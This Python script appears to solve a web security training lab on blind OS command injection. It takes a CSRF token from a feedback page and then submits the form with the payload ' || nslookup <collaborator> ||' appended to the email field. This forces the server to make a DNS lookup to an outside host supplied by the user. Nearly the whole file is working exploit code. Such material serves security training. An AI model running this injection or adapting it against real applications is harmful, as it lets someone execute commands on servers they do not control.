# Blind OS command injection with out-of-band interaction

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}




##########################################################
#	FUNCTIONS
##########################################################


def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token: %s' % csrf)
	return csrf

def run_nslookup(s, url, collab):
	submit_path = url + '/feedback/submit'
	feedback_path = url + '/feedback'
	command_injection = ' || nslookup %s ||' % collab
	print("[+] Extracting CSRF Token from the feedback page...")
	r = s.get(feedback_path)
	csrf_token = get_csrf_token(r)
	params = {'email': 'test@test.com' + command_injection, 'name': 'gwyo', 'subject': 'hacked', 'message': 'H4ck3d!!!', 'csrf': csrf_token}
	print("[+] Trying to run command 'nslookup' on the Burp Collaborator...\n")
	res = s.post(submit_path, data=params, verify=False, proxies=proxies)
	



##########################################################
#	MAIN
##########################################################


def main():
	print('[+] Lab: Blind OS command injection with out-of-band interaction')
	try:
		url = sys.argv[1].strip()
		collab = sys.argv[2].strip()
	except IndexError:
		print('[+] Usage: %s <URL> <COLLABORATOR>' % sys.argv[0])
		print('[+] Usage: %s https://www.example.com anything.oastify.com' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print('[+] Trying OS Command Injection force the victim server to send a DNS request to arbitrary address...\n')
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			run_nslookup(s, url, collab)
			time.sleep(2)
			r = requests.get(url, verify=False, proxies=proxies)
			print(r)
			if 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved !')

	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()